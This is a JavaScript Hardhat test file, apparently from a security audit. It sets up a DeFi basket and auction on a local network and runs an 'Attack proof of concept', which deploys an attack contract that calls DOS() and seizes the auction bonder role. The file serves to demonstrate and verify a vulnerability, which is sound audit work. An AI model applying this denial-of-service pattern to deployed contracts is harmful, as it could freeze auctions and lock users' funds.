const { expect } = require("chai");
const { ethers } = require("hardhat");

const ZERO_ADDRESS = '0x0000000000000000000000000000000000000000'

const UNI_WEIGHT = '5000000000000000000';
const COMP_WEIGHT = '1000000000000000000';
const AAVE_WEIGHT = '1000000000000000000';

const fee = `${Math.pow(10,16)}`;
const tokenName = "UCA";
const tokenSymbol = "UCA";
const max = `10000000000000000000000`


let owner, addr1, addr2;
let factory, UNI, COMP, AAVE, basket, AuctionImpl, BasketImpl, AttackImpl;

async function mineBlocks(blockNumber) {
    while (blockNumber > 0) {
      blockNumber--;
      await hre.network.provider.request({
        method: "evm_mine",
        params: [],
      });
    }
}

async function increaseTime(time) {
  await hre.network.provider.send("evm_increaseTime", [time])
}

describe("Attack", function () {
    beforeEach(async () => {
        [owner, addr1, addr2] = await ethers.getSigners();
    
        const Factory = await ethers.getContractFactory("Factory");
        AuctionImpl = await ethers.getContractFactory("Auction");
        const auctionImpl = await AuctionImpl.deploy();
        BasketImpl = await ethers.getContractFactory("Basket");
        const basketImpl = await BasketImpl.deploy();
        const TestToken = await ethers.getContractFactory("TestToken");
        AttackImpl = await ethers.getContractFactory('Attack');
        
        

        factory = await Factory.deploy(auctionImpl.address, basketImpl.address);
        await factory.deployed();

        UNI = await TestToken.deploy('UNI', 'UNI');
        await UNI.deployed();
    
        COMP = await TestToken.deploy('COMP', 'COMP');
        await COMP.deployed();
    
        AAVE = await TestToken.deploy('AAVE', 'AAVE');
        await AAVE.deployed();

        await UNI.mint(UNI_WEIGHT);
        await COMP.mint(COMP_WEIGHT);
        await AAVE.mint(AAVE_WEIGHT);

        await factory.proposeBasketLicense(fee, 
            tokenName, 
            tokenSymbol, 
            [UNI.address, COMP.address, AAVE.address], 
            [UNI_WEIGHT, COMP_WEIGHT, AAVE_WEIGHT],
            max);

        
        await UNI.approve(factory.address, `${UNI_WEIGHT}`);
        await COMP.approve(factory.address, `${COMP_WEIGHT}`);
        await AAVE.approve(factory.address, `${AAVE_WEIGHT}`);

        await factory.createBasket(0);
        let proposal = await factory.proposal(0);
        basket = BasketImpl.attach(proposal.basket);
      });
      
      it("Attack proof of concept", async () => {
        let NEW_UNI_WEIGHT = "2400000000000000000";
        let NEW_COMP_WEIGHT = "2000000000000000000";
        let NEW_AAVE_WEIGHT = "400000000000000000";

        await expect(basket.publishNewIndex([UNI.address, COMP.address, AAVE.address], 
            [NEW_UNI_WEIGHT, NEW_COMP_WEIGHT, NEW_AAVE_WEIGHT], 1)).to.be.ok;
        await increaseTime(60 * 60 * 24)
        await increaseTime(60 * 60 * 24)

        
        await expect(basket.publishNewIndex([UNI.address, COMP.address, AAVE.address], 
          [NEW_UNI_WEIGHT, NEW_COMP_WEIGHT, NEW_AAVE_WEIGHT], 1)).to.be.ok;

        let auctionAddr = await basket.auction();
        let auction = AuctionImpl.attach(auctionAddr, basket.address);

        await basket.approve(auction.address, '5000000000000000');
        const attackImpl = await AttackImpl.deploy(auctionAddr, basket.address);
        await basket.transfer(attackImpl.address, basket.totalSupply());
        await basket.approve(attackImpl.address, basket.totalSupply());
        console.log("attack", await basket.balanceOf(attackImpl.address));
        console.log("attack auction address", await attackImpl.auction(), auctionAddr);
        await expect(attackImpl.DOS()).to.be.ok;
        console.log("auction bonder address", await auction.auctionBonder(), attackImpl.address);
        const bonder = await auction.auctionBonder()
        expect(bonder).to.equal(attackImpl.address);
      });
    });